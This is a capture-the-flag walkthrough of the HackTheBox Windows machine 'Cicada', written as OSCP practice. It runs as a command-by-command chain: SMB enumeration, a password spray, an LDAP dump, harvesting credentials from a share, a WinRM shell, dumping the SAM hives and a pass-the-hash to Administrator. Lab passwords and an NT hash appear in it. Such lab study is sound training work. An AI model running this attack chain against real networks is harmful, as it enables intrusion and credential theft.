## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)
- **Exploits Used**:
  - Null‑session SMB enumeration 🗂️  
  - Password spray via `netexec` 🔧  
  - LDAP dump with `ldapdomaindump` 📋  
  - SMB share discovery & credential harvest 🔍  
  - WinRM shell with `evil-winrm` 🪓  
  - Priv‑Esc: `SeBackupPrivilege` → `reg save` → `impacket‑secretsdump` → Pass‑the‑Hash  

---

## 🕵️ Recon

```bash
# fast full-port + default scripts
sudo nmap -sC -sV -p- 10.129.198.41 -oA nmap/cicada

# check null‑session SMB shares
nxc smb 10.129.198.41 -u guest -p '' --shares
```

- **SMB** (445) – null‑session allows listing `HR` share
- **Kerberos** (88), **LDAP** (389/636/3268/3269), **WinRM** (5985)

---

## 💥 Initial Foothold

1. **SMB null‑session → HR share**  
   ```bash
   smbclient //10.129.198.41/HR -U guest
   smb: \> get "Notice from HR.txt"
   ```
2. **Notice from HR.txt** contains default password  
   ```
   Cicada$M6Corpb*@Lp#nZp!8
   ```
3. **RID‑brute** to enumerate users  
   ```bash
   nxc smb 10.129.198.41 -u guest -p '' --rid-brute > rids.txt
   awk -F'\\\\|\\(' '{print $2}' rids.txt | tail -n +5 > users.txt
   ```
4. **Password spray** against user list  
   ```bash
   nxc smb 10.129.198.41 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' \
     --continue-on-success
   ```
   → **michael.wrightson** authenticated ✅

5. **LDAP dump** with valid creds  
   ```bash
   ldapdomaindump -u cicada.htb\\michael.wrightson \
     -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.129.198.41 -o ldapdump
   ```
6. **Found `david.orelious` password** in LDAP attribute →  
   `aRt$Lp#7t*VQ!3`

---

## 🔍 Pivot & Credential Harvest

1. **SMB with `david.orelious`**  
   ```bash
   smbclient //10.129.198.41/DEV -U david.orelious
   smb: \> get Backup_script.ps1
   ```
2. **Backup_script.ps1** reveals **`emily.oscars:Q!3@Lp#M6b*7t*Vt`**  
3. **WinRM shell as Emily**  
   ```bash
   evil-winrm -i 10.129.198.41 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
   ```
4. **Grab user flag**  
   ```powershell
   type C:\Users\emily.oscars.CICADA\Desktop\user.txt
   # => d333d*********************
   ```

---

## 🚀 Privilege Escalation

1. **Check Emily’s privileges**  
   ```powershell
   whoami /priv
   # SeBackupPrivilege          Enabled
   # SeRestorePrivilege         Enabled
   ```
2. **Dump SAM & SYSTEM hives**  
   ```powershell
   mkdir C:\temp
   reg save hklm\sam C:\temp\sam.hive
   reg save hklm\system C:\temp\system.hive
   ```
3. **Download hives to Kali**  
   ```powershell
   download C:\temp\sam.hive
   download C:\temp\system.hive
   ```
4. **Extract NT hashes**  
   ```bash
   impacket-secretsdump -sam sam.hive -system system.hive local
   # Administrator:500:…:2b87e7c93a3e8a0ea4a581937016f341
   ```
5. **Pass‑the‑hash as Administrator**  
   ```bash
   impacket-psexec cicada.htb/Administrator@10.129.198.41 \
     -hashes 'aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341'
   ```
6. **Get SYSTEM shell & root flag**  
   ```powershell
   type C:\Users\Administrator\Desktop\root.txt
   # => 84702***********************
   ```

---

## 🎉 Results

- **User flag**: `d333d*********************`  
- **Root flag**: `84702***********************`  

---

## 🛠 Tools & References

- **SMB & Kerberos**: `nmap`, `netexec`, `smbclient`  
- **LDAP dump**: [ldapdomaindump](https://github.com/BloodHoundAD/ldapdomaindump)  
- **WinRM**: [`evil-winrm`](https://github.com/Hackplayers/evil-winrm)  
- **Priv‑Esc**: [`impacket`](https://github.com/SecureAuthCorp/impacket)  

✌️ Happy hacking!